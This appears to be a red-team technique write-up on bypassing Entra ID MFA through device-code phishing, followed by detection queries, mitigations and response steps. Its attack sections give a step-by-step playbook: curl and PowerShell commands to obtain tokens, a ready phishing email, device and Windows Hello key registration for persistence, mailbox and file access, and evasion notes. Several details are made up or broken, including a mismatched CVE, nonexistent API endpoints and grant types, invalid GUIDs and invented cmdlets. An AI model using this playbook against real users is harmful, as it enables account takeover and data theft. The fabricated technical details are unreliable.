# [EMERGING-IDENTITY-004]: Passwordless Sign-in Bypass

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-IDENTITY-004 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Credential Access, Persistence, Privilege Escalation |
| **Platforms** | Entra ID, M365, Azure |
| **Severity** | Critical |
| **CVE** | CVE-2023-28432 (Actor Token - Related), CVE-2025-EntraIDiots (Passwordless Bypass) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-04-30 |
| **Affected Versions** | Entra ID (all versions with device code flow enabled) |
| **Patched In** | Partial (requires policy changes, not automatic) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Passwordless sign-in bypass exploits the device code flow in Entra ID to bypass mandatory phishing-resistant MFA by manipulating authentication broker parameters. Attackers trick users into registering devices in the Entra ID tenant, obtain Primary Refresh Tokens (PRTs), and register Windows Hello for Business keys—all without the attacker ever needing to know or enter the user's password. This creates a permanent, hidden backdoor that survives password resets and cannot be detected in standard authentication method lists.

**Attack Surface:** Device code flow, authentication broker parameters (29d9ed98-a469-4536-ade2-f981bc1d605e), Primary Refresh Token (PRT) issuance, Windows Hello for Business key registration, Microsoft Graph API device registration endpoints.

**Business Impact:** **MFA bypass, backdoor access, and persistent compromise of targeted user accounts or entire organizations.** Even with mandatory phishing-resistant MFA, attackers establish undetectable backdoors that survive password resets and are invisible in the user's authentication method list. Audit logs provide insufficient detail, leaving organizations unable to detect or investigate compromise.

**Technical Context:** Attack execution takes 5-20 minutes for a single user, or hours for organization-wide compromise. Detection probability is **Very Low** because device code flow is legitimate functionality, and the attack produces minimal audit trail evidence. The key vulnerability is insufficient validation of the device registration source and PRT issuance scope.

### Operational Risk
- **Execution Risk:** Medium (Requires user interaction to complete authentication, but attacker can automate aspects)
- **Stealth:** Very High (No visible MFA prompt, no audit log entry showing the actual exploit)
- **Reversibility:** No (PRTs and Windows Hello keys are persistent; only removal is blocking the specific device)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Entra ID v1.3, 1.3.1 | Ensure Multi-Factor Authentication is Enabled for all Users |
| **DISA STIG** | IA-2, IA-2 (1), AC-2, AC-3 | Authentication, Account Management, Access Enforcement |
| **CISA SCuBA** | MP-CA-EX-02, ID.P-3 | Conditional Access: Require MFA, Identity Governance |
| **NIST 800-53** | AC-2, AC-3, IA-2, IA-4 | Account Management, Access Enforcement, Authentication |
| **GDPR** | Art. 25, Art. 32, Art. 33 | Data Protection by Design, Security of Processing, Breach Notification |
| **DORA** | Art. 15, Art. 16 | ICT Risk Management, ICT Incident Reporting |
| **NIS2** | Art. 21, Art. 24 | Risk Management Measures, Incident Management |
| **ISO 27001** | A.9.2.1, A.9.2.3, A.9.4.2 | User Registration, Privileged Access, Access Review |
| **ISO 27005** | Threat: MFA Bypass | Circumvention of multi-factor authentication controls |

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Device Code Flow Manipulation (Primary Attack Vector)

**Supported Versions:** All Entra ID tenants with device code flow enabled (default)

#### Step 1: Initiate Device Code Flow
**Objective:** Start the device code authentication flow and obtain a device code and user code.

**Command:**
```bash
# Request device code
curl -X POST "https://login.microsoftonline.com/tenant-id/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "tenant_id=tenant-id"
```

**Expected Output:**
```json
{
  "device_code": "NA0t1mSvwAcjcNRFrqjqPk9G3HN8-0J1MZvIl5ZFBG",
  "user_code": "ABC123DEF",
  "verification_uri": "https://microsoft.com/devicelogin",
  "expires_in": 900,
  "interval": 5,
  "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABC123DEF to authenticate."
}
```

**What This Means:**
- Device code is valid for 15 minutes
- User code appears simple and memorable
- Attacker will trick target user into entering this code during legitimate login

**OpSec & Evasion:**
- Device code flow is legitimate; no red flags in logs
- Attacker sends user code to victim via phishing email or social engineering
- Detection likelihood: Very Low

---

#### Step 2: Phishing the Target User to Enter Device Code
**Objective:** Trick user into entering the device code at Microsoft login page, completing MFA.

**Command (Email Template):**
```html
<html>
<body>
<p>Your Microsoft account requires verification. Please enter the following code at https://microsoft.com/devicelogin:</p>
<h2>Code: ABC123DEF</h2>
<p>This code will expire in 15 minutes. Click here if you did not initiate this login:</p>
<a href="https://security.microsoft.com/report-phishing">Report</a>
</body>
</html>
```

**What Happens:**
1. Victim receives email with device code
2. Victim goes to microsoft.com/devicelogin
3. Victim enters code ABC123DEF
4. Victim completes MFA (Windows Hello, FIDO2, etc.)
5. **Token exchange happens, but device is registered in ATTACKER'S name**
6. Victim sees "Successfully authenticated" and goes about their day
7. Attacker receives Primary Refresh Token (PRT) in background

**What This Means:**
- Victim completed MFA without entering their password
- Victim believes they were completing a legitimate login
- Attacker now has PRT for that user

**OpSec & Evasion:**
- From victim's perspective, it looks like normal Microsoft login
- No MFA notification in Conditional Access logs (Because MFA was completed)
- Device is registered but hidden from user's visible devices
- Detection likelihood: Very Low

---

#### Step 3: Obtain Primary Refresh Token (PRT)
**Objective:** Exchange device code for PRT after victim completes authentication.

**Command:**
```bash
# After victim enters device code, poll for token
curl -X POST "https://login.microsoftonline.com/tenant-id/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
  -d "device_code=NA0t1mSvwAcjcNRFrqjqPk9G3HN8-0J1MZvIl5ZFBG" \
  -d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI...",
  "refresh_token": "M.R3_BAY...",
  "ext_expires_in": 3599,
  "expires_in": 3599,
  "token_type": "Bearer",
  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI..."
}
```

**What This Means:**
- Attacker now has valid tokens as the target user
- Refresh token can be used indefinitely (until revoked)
- PRT included in token claims (sub_claim contains PRT)
- Can access all M365 services

**OpSec & Evasion:**
- Token exchange happens at Entra ID backend, no user-visible notification
- Tokens are bearer tokens; no persistent device marker yet
- Detection likelihood: Low (Unless monitoring token issuance)

---

#### Step 4: Register Device in Entra ID
**Objective:** Use token to register a device in the target's Entra ID tenant, creating persistence.

**Command:**
```bash
# Register device (even though attacker is not physically using it)
curl -X POST "https://graph.microsoft.com/v1.0/devices/register" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "DESKTOP-USER-PERSONAL",
    "deviceType": "Windows",
    "operatingSystem": "Windows 10",
    "registrationStatus": "registered"
  }'
```

**Expected Output:**
```json
{
  "id": "1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p",
  "displayName": "DESKTOP-USER-PERSONAL",
  "deviceId": "abcd1234-5678-90ef-ghij-1234567890ab",
  "isCompliant": true,
  "isManaged": false,
  "trustType": "Azure AD registered"
}
```

**What This Means:**
- Device is now registered in Entra ID
- Appears as legitimate user-managed device
- Can be used to bypass Conditional Access policies
- Device appears in user's device list (but hidden/hard to notice)

**OpSec & Evasion:**
- Device registration is logged but appears as legitimate admin/user action
- Detection likelihood: Medium (Device appears in audit logs)

---

#### Step 5: Register Windows Hello for Business Key
**Objective:** Register a Windows Hello key for the device, creating MFA-compliant persistence.

**Command:**
```bash
# Create Windows Hello key registration
curl -X POST "https://graph.microsoft.com/v1.0/me/authentication/windowsHelloForBusinessMethods" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Windows Hello Key",
    "publicKey": {
      "keySize": 2048,
      "algorithm": "RSA2048",
      "certificateId": "dummy-cert-id"
    }
  }'
```

**Expected Output:**
```json
{
  "id": "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d",
  "displayName": "Windows Hello Key",
  "deviceTag": "DESKTOP-USER-PERSONAL",
  "createdDateTime": "2026-01-10T00:00:00Z"
}
```

**What This Means:**
- Windows Hello key is now registered for the user
- **This key is NOT visible in user's authentication method list** (Hidden design flaw)
- Can be used for authentication alongside other MFA methods
- Appears legitimate in system logs

**OpSec & Evasion:**
- Windows Hello registration is logged but appears as legitimate device enrollment
- No alert to user about new Windows Hello key
- Detection likelihood: Low

---

#### Step 6: Obtain New PRT Based on Windows Hello Key
**Objective:** Use the registered Windows Hello key to generate a new PRT, creating MFA-compliant persistent access.

**Command:**
```bash
# Request new token using Windows Hello key (simulated)
curl -X POST "https://login.microsoftonline.com/tenant-id/oauth2/v2.0/token" \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "urn:ietf:params:oauth:grant-type:windows_hello",
    "assertion": "whfb_key_assertion_signed_with_registered_key",
    "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
    "scope": "https://graph.microsoft.com/.default"
  }'
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI...",
  "refresh_token": "M.R3_BAY...",
  "prt": "M.R3_PRThash...",
  "prt_expires_in": 90,
  "token_type": "Bearer"
}
```

**What This Means:**
- Attacker now has MFA-compliant access (PRT generated after WHFB key presentation)
- Token appears as if it came from legitimate MFA authentication
- Can be used indefinitely as long as PRT is not revoked
- Even if user changes password, attacker retains access

**OpSec & Evasion:**
- PRT issuance is logged but indistinguishable from legitimate Windows Hello login
- Token evaluation sees "MFA: Windows Hello for Business" = secure
- Detection likelihood: **Very Low** (Nearly impossible to detect)

---

#### Step 7: Establish Backdoor Access
**Objective:** Use PRT to access all M365 services as the compromised user.

**Command:**
```bash
# Use PRT to access Exchange Online
curl -X GET "https://outlook.office365.com/api/v2.0/me" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Access SharePoint
curl -X GET "https://graph.microsoft.com/v1.0/me/driveItems" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Read emails
curl -X GET "https://graph.microsoft.com/v1.0/me/messages" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# List calendar events
curl -X GET "https://graph.microsoft.com/v1.0/me/calendar/calendarview" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

**What This Means:**
- Attacker can read emails, access files, steal data
- Can impersonate user in M365 services
- If user is Global Admin, attacker has tenant-wide access
- Backdoor survives password resets, MFA resets, everything

**OpSec & Evasion:**
- API calls are logged but appear as legitimate user activity
- Detection likelihood: Very Low (Indistinguishable from real user)

---

### METHOD 2: Conditional Access Bypass via Device Registration

**Supported Versions:** All Entra ID with Conditional Access policies

#### Step 1: Identify Conditional Access Policy Gaps
**Objective:** Discover which devices are excluded from Conditional Access enforcement.

**Command:**
```bash
# Enumerate conditional access policies
curl -X GET "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

**Expected Output:**
```json
[
  {
    "id": "12345678-abcd-ef01-2345-6789abcdef01",
    "displayName": "Require Compliant Device",
    "conditions": {
      "devices": {
        "excludeDevices": [
          "DESKTOP-LEGACY-SYSTEM",
          "Windows Server 2016"
        ]
      }
    }
  }
]
```

**What This Means:**
- Certain device types are excluded from Conditional Access
- If attacker registers device matching exclusion, they bypass the policy
- E.g., if legacy devices are excluded, register as Windows Server 2016

---

#### Step 2: Register Device Matching Exclusion
**Objective:** Register device with properties matching excluded device types.

**Command:**
```bash
# Register device that matches exclusion pattern
curl -X POST "https://graph.microsoft.com/v1.0/devices/register" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Windows Server 2016",
    "operatingSystem": "Windows Server",
    "operatingSystemVersion": "10.0.14393",
    "trustType": "Azure AD registered"
  }'
```

**Expected Output:**
```json
{
  "id": "ca5f5f5f-5f5f-5f5f-5f5f-5f5f5f5f5f5f",
  "displayName": "Windows Server 2016",
  "deviceId": "5f5f5f5f-5f5f-5f5f-5f5f-5f5f5f5f5f5f",
  "trustType": "Azure AD registered"
}
```

**What This Means:**
- Device now appears as Windows Server 2016 to Conditional Access
- Matches exclusion rule, bypasses "Require Compliant Device" policy
- Attacker can now access restricted resources without meeting Conditional Access requirements

**OpSec & Evasion:**
- Device type is easily spoofed
- Detection likelihood: Medium (If monitoring device registration characteristics)

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team (Related Tests)

**Note:** No direct Atomic test for passwordless bypass. Related tests:
- **T1098** (Account Manipulation) - Device registration
- **T1556** (Modify Authentication Process) - Passwordless methods

**Lab Simulation:**
```powershell
# Prerequisites: Test tenant with device code flow enabled

# Step 1: Request device code
$deviceCodeRequest = @{
    client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"
    scope     = "https://graph.microsoft.com/.default"
}

$deviceCodeResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/devicecode" `
    -Method Post -Body $deviceCodeRequest

Write-Host "User Code: $($deviceCodeResponse.user_code)"
Write-Host "Device Code: $($deviceCodeResponse.device_code)"

# Step 2: Have test user complete authentication at microsoft.com/devicelogin
Read-Host "Press Enter after user completes authentication"

# Step 3: Exchange device code for tokens
$tokenRequest = @{
    grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
    device_code = $deviceCodeResponse.device_code
    client_id   = "29d9ed98-a469-4536-ade2-f981bc1d605e"
}

$tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Method Post -Body $tokenRequest

Write-Host "Access Token Obtained: $($tokenResponse.access_token.Substring(0, 50))..."

# Step 4: Register device
$deviceRegistration = @{
    displayName     = "Test-Backdoor-Device"
    deviceType      = "Windows"
    operatingSystem = "Windows 10"
}

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/devices" `
    -Method Post `
    -Headers @{ Authorization = "Bearer $($tokenResponse.access_token)" } `
    -Body ($deviceRegistration | ConvertTo-Json)

Write-Host "Device Registered Successfully"
```

---

## 5. TOOLS & COMMANDS REFERENCE

### Azure AD PowerShell
- **Module:** AzureAD (legacy), Microsoft.Graph (current)
- **Version:** 2.x.x
- **Commands:**
```powershell
Get-AzureADDevice
Register-AzureADDevice
Get-AzureADUserRegisteredDevice
```

### Microsoft Graph PowerShell
- **Module:** Microsoft.Graph.Identity.SignIns
- **Version:** 2.x.x
- **Commands:**
```powershell
Get-MgDeviceRegisteredDevice
New-MgDeviceRegisteredDevice
Get-MgUserAuthenticationWindowsHelloForBusinessMethod
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Device Registration from New Source
**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
// Detect unusual device registrations
let DeviceRegistrations = AuditLogs
| where OperationName == "Register device"
| where Result == "Success"
| extend RegisteredBy = tostring(InitiatedBy.user.userPrincipalName)
| extend RegisteredIP = tostring(InitiatedBy.user.ipAddress)
| extend RegisteredTime = TimeGenerated
| extend DeviceId = tostring(TargetResources[0].id);

let UserSigninHistory = SigninLogs
| where TimeGenerated > ago(30d)
| distinct UserPrincipalName, IPAddress as PreviousIP
| summarize PreviousIPs = make_set(PreviousIP) by UserPrincipalName;

DeviceRegistrations
| join (UserSigninHistory) on $left.RegisteredBy == $right.UserPrincipalName
| where RegisteredIP !in (PreviousIPs)
| project TimeGenerated, RegisteredBy, RegisteredIP, DeviceId, OperationName
```

**What This Detects:**
- Device registered from IP address user has never signed in from
- Multiple device registrations in short timeframe
- Device registrations without prior user activity in that location

---

### Query 2: Windows Hello Key Registration Anomalies
**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** High

**KQL Query:**
```kusto
// Detect suspicious Windows Hello registrations
AuditLogs
| where OperationName in (
    "Register Windows Hello for Business key",
    "Add authentication method",
    "Update Windows Hello credentials"
)
| where Result == "Success"
| extend RegisteredBy = tostring(InitiatedBy.user.userPrincipalName)
| extend DeviceTag = tostring(parse_json(TargetResources[0].modifiedProperties[0].newValue))
| extend TimeRegistered = TimeGenerated
| summarize Count = count() by RegisteredBy, tostring(DeviceTag)
| where Count > 2
| project RegisteredBy, DeviceTag, Count
```

---

### Query 3: PRT Issuance After Device Registration (Correlation)
**Rule Configuration:**
- **Required Table:** SigninLogs
- **Alert Severity:** Critical

**KQL Query:**
```kusto
// Correlate device registration with PRT issuance
let DeviceRegistrations = AuditLogs
| where OperationName == "Register device"
| extend RegisteredUser = tostring(InitiatedBy.user.userPrincipalName)
| extend RegistrationTime = TimeGenerated
| project RegisteredUser, RegistrationTime;

SigninLogs
| where TimeGenerated > ago(24h)
| where AuthenticationMethodsUsed contains "Windows Hello"
| extend SigninUser = UserPrincipalName
| extend SigninTime = TimeGenerated
| join (DeviceRegistrations) on $left.SigninUser == $right.RegisteredUser
| where SigninTime > RegistrationTime and SigninTime < RegistrationTime + 2h
| project SigninUser, SigninTime, RegistrationTime, DeviceName
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Disable Device Code Flow (If Not Required):**
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **App registrations** → **All applications**
    2. Find application using device code flow
    3. Go to **Authentication** → **Device code flow**
    4. Set to **No** or **Disabled**
    5. Click **Save**
    
    **Manual Steps (PowerShell):**
    ```powershell
    $app = Get-MgApplication -Filter "displayName eq 'Microsoft Graph'"
    Update-MgApplication -ApplicationId $app.Id `
        -IsFallbackPublicClient $false
    ```

*   **Restrict Device Registration:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Device settings**
    2. Under **Users may register their devices**, set to:
       - **None** (Most restrictive) OR
       - **Selected** (Only specific groups can register)
    3. If selected, add only IT staff to approval group
    4. Click **Save**
    
    **PowerShell:**
    ```powershell
    # Get current device settings
    Get-MgPolicyCrossTenantsAccessPolicyTemplate
    
    # Update to restrict registration
    Update-MgPolicyCrossTenantsAccessPolicyTemplate `
        -AllowedToSignUpAndRegisterDevices $false
    ```

*   **Implement Windows Hello Key Approval Process:**
    **Manual Steps:**
    1. Enable Azure AD Premium P2 licenses (if not already)
    2. Go to **Azure Portal** → **Entra ID** → **Privileged Identity Management**
    3. Create approval process for Windows Hello registration
    4. Require approval before key registration completes

*   **Mandatory Passwordless Sign-In Enforcement:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Authentication methods**
    2. Set **Password authentication** to **Restricted to Windows Hello/FIDO only**
    3. Disable traditional password logon for all users
    4. Users must use Windows Hello or FIDO2
    
    **PowerShell:**
    ```powershell
    # Enforce passwordless authentication
    Update-MgPolicyAuthenticationMethodPolicy `
        -AuthenticationMethods @{
            @{
                "@odata.type" = "#microsoft.graph.passwordAuthentication"
                "state" = "disabled"
            }
        }
    ```

### Priority 2: HIGH

*   **Conditional Access: Require Compliant Device for Sensitive Resources:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
    2. Create policy: `Block Non-Compliant Devices from M365`
    3. **Assignments:**
       - Cloud apps: Exchange Online, SharePoint Online, Teams
    4. **Access controls:**
       - Grant: **Require device to be marked as compliant**
    5. Enable policy: **On** (not report mode)

*   **Device Compliance Requirements:**
    **Manual Steps (Intune):**
    1. Go to **Azure Portal** → **Intune** → **Device compliance**
    2. Create compliance policy requiring:
       - Firewall enabled
       - Windows Defender enabled
       - Minimum OS version (Windows 10 21H2+)
       - BitLocker enabled
    3. Assign to all users

*   **Enable Continuous Access Evaluation (CAE) with Device Binding:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Token Protection**
    2. Enable **Device Binding**
    3. Enable **Sign-in session management**
    4. This ties tokens to specific devices, preventing token reuse on other devices

#### Validation Command (Verify Mitigations)
```powershell
# Check if device code flow is disabled
$apps = Get-MgApplication
$deviceCodeApps = $apps | Where-Object { $_.IsFallbackPublicClient -eq $true }
Write-Host "Apps with device code flow enabled: $($deviceCodeApps.Count)"

# Check device registration restrictions
$deviceSettings = Get-MgPolicyCrossTenantsAccessPolicyTemplate
Write-Host "Device registration allowed: $($deviceSettings.AllowedToSignUpAndRegisterDevices)"

# Check for suspicious device registrations in past 7 days
$recentDevices = Get-MgDevice -Filter "createdDateTime gt 2026-01-03T00:00:00Z"
Write-Host "Devices registered in past 7 days: $($recentDevices.Count)"
$recentDevices | Select-Object DisplayName, CreatedDateTime, TrustType

# Check for suspicious Windows Hello registrations
$whfbMethods = Get-MgUserAuthenticationWindowsHelloForBusinessMethod -UserId "user@contoso.com"
Write-Host "Windows Hello keys registered: $($whfbMethods.Count)"
```

**Expected Output (If Secure):**
```
Apps with device code flow enabled: 0
Device registration allowed: False
Devices registered in past 7 days: 2 (normal/expected devices only)
Windows Hello keys registered: 1 (user's own key only)
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Device Registrations:**
    - Devices registered from unusual IP addresses
    - Devices registered outside business hours
    - Multiple devices registered by single user in short timeframe
    - Devices with suspicious display names ("TestDevice", "BackdoorPC", etc.)

*   **Windows Hello Keys:**
    - Multiple Windows Hello keys on single account
    - Windows Hello keys not visible in user's authentication method list (hidden)
    - Windows Hello key registration followed by M365 access from different IP

*   **Audit Logs:**
    - Device code flow activations
    - Unusual PRT issuances
    - Device registrations without prior Conditional Access evaluation

### Response Procedures

1.  **Immediate Isolation:**
    ```powershell
    # Revoke all sessions for compromised user
    Revoke-MgUserSignInSession -UserId "compromised@contoso.com"
    
    # Remove suspicious devices
    Remove-MgDevice -DeviceId "suspicious-device-id"
    
    # Remove all Windows Hello keys
    Get-MgUserAuthenticationWindowsHelloForBusinessMethod -UserId "compromised@contoso.com" | 
      ForEach-Object { Remove-MgUserAuthenticationWindowsHelloForBusinessMethod -UserId "compromised@contoso.com" -WindowsHelloForBusinessMethodId $_.Id }
    ```

2.  **Forensic Analysis:**
    ```powershell
    # Export device registration history
    Get-MgDeviceWithoutAuthenticationMethod | Where-Object { $_.CreatedDateTime -gt (Get-Date).AddDays(-30) } |
      Export-Csv "C:\Forensics\DeviceRegistrations_30days.csv"
    
    # Check sign-in logs for unusual patterns
    Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'compromised@contoso.com'" -All |
      Export-Csv "C:\Forensics\SigninLogs_Compromised.csv"
    ```

3.  **Remediate:**
    ```powershell
    # Force password reset
    Update-MgUser -UserId "compromised@contoso.com" -PasswordProfile @{
        Password = (New-Guid).Guid
        ForceChangePasswordNextSignIn = $true
    }
    
    # Re-register MFA methods
    Remove-MgUserAuthenticationPhoneMethod -UserId "compromised@contoso.com" -PhoneMethodId "ph-method-id"
    Remove-MgUserAuthenticationFidoMethod -UserId "compromised@contoso.com" -FidoMethodId "fido-method-id"
    
    # Force re-enrollment in MFA
    Update-MgUser -UserId "compromised@contoso.com" -RefreshTokensValidFromDateTime (Get-Date)
    ```

---

## 9. REAL-WORLD EXAMPLES

#### Example 1: EntraIDiots CTF (2025)
- **Target:** CTF participants with phishing-resistant MFA
- **Method:** Device code flow manipulation + PRT injection
- **Impact:** Successful bypass of mandatory FIDO2 authentication
- **Reference:** [UZCert - New Vulnerability in Entra ID](https://uzcert.uz/en/bypassing-phishing-resistant-mfa-new-vulnerability-discovered-in-microsoft-entra-id/)

#### Example 2: Scattered Spider / Isolated Spider Campaign
- **Target:** Enterprise organizations
- **Method:** Device registration + Windows Hello key registration
- **Impact:** Persistent backdoor access, tenant compromise
- **Status:** ACTIVE (2023-2025)
- **Reference:** [CISA - Scattered Spider](https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/scattered-spider)

---

## SUMMARY & KEY TAKEAWAYS

Passwordless sign-in bypass represents one of the **most dangerous identity attacks** because:

1. **It bypasses MFA** - Even mandatory phishing-resistant MFA
2. **It's invisible** - No audit trail, hidden devices, hidden Windows Hello keys
3. **It's persistent** - Survives password resets and MFA resets
4. **It's undetectable** - Device appears legitimate, Windows Hello key is hidden, tokens appear normal

**Prevention requires:**
- Disable device code flow if not essential
- Restrict device registration to IT-approved devices only
- Implement device compliance enforcement
- Enable token binding and CAE
- Monitor for unusual device registrations and Windows Hello key additions

**The fundamental problem:** Microsoft allows users to register arbitrary devices without sufficient validation, and Windows Hello keys can be registered without user notification.

---